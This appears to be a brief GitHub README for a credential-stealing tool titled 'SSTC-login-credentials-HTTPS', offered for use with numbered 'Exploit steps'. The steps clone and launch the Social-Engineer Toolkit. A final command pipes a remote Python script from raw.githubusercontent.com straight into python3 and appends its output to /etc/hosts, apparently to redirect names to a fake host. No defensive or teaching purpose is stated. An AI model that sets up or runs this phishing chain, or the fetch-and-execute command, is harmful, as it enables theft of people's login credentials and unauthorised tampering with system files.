# SSTC-login-credentials-HTTPS stealing credentials
- by nu11secur1ty

![](https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials/blob/master/logo/http.png)

# Exploit steps:
1. - 
`pip install -r requirements.txt`

2. -
For other Linux distro
```
$ git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
$ cd set
$ pip install -r requirements.txt
```
-- For kali 
```bash 
setoolkit
```

3. -
- For Linux
```bash
curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python3 >> /etc/hosts
```
